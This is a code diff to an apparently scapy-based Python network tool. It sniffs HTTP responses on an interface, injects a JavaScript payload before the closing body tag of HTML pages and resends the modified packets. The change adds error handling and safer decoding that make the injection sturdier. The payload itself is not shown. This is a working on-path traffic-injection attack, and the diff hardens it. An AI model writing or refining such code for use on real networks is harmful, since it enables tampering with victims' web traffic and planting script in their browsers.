@@ -58,14 +58,21 @@ def packet_sniffer(interface):
 # Callback function for sniffed packets
 def packet_callback(packet):
     if packet.haslayer(HTTPResponse):
-        if b"text/html" in packet[HTTPResponse].Content_Type:
-            # Inject JavaScript into HTTP response
-            payload = packet[HTTPResponse].payload.load.decode()
-            injected_payload = payload.replace("</body>", f"{INJECTION_CODE}</body>")
-            packet[HTTPResponse].payload.load = injected_payload.encode()
+        try:
+            # Attempt to decode the payload safely
+            payload = packet[HTTPResponse].payload.load.decode(errors="replace")
+            if b"text/html" in packet[HTTPResponse].Content_Type:
+                # Inject JavaScript into HTTP response
+                injected_payload = payload.replace("</body>", f"{INJECTION_CODE}</body>")
+                packet[HTTPResponse].payload.load = injected_payload.encode()
 
-            # Send the modified packet
-            send(packet)
+                # Send the modified packet
+                send(packet)
+        except AttributeError:
+            # Skip packets without payload or decode issues
+            print("Packet does not have a valid payload or decoding failed.")
+        except Exception as e:
+            print(f"An error occurred: {e}")
 
 # Main function
 def main(interface):
